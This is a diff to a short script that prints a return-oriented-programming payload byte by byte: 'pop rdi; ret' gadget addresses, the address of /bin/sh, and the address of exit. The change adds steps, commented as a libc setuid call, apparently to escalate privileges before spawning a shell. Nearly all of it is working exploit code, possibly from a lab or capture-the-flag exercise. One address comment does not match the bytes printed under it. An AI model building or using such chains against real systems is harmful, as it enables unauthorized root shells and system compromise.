@@ -19,6 +19,15 @@ print "\x30\x80\xa4\xf7\xff\x7f\x00\x00";
 # pop rdi; ret;
 print "\xe3\x06\x40\x00\x00\x00\x00\x00";
 #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+# Add argument for set-udi to rdi
+# Call set-udi from libc
+
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+#0x00 00 00 00 00 40 06 e3
+# pop rdi; ret;
+print "\xe3\x06\x40\x00\x00\x00\x00\x00";
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 #0x00 00 7f ff ff ff de 30
 # Address of /bin/sh
 print "\x77\xa1\xb9\xf7\xff\x7f\x00\x00";
@@ -32,5 +41,4 @@ print "\x90\x33\xa5\xf7\xff\x7f\x00\x00";
 #0x00 00 7f ff f7 a4 80 30
 # Address of exit
 print "\x30\x80\xa4\xf7\xff\x7f\x00\x00";
-
 
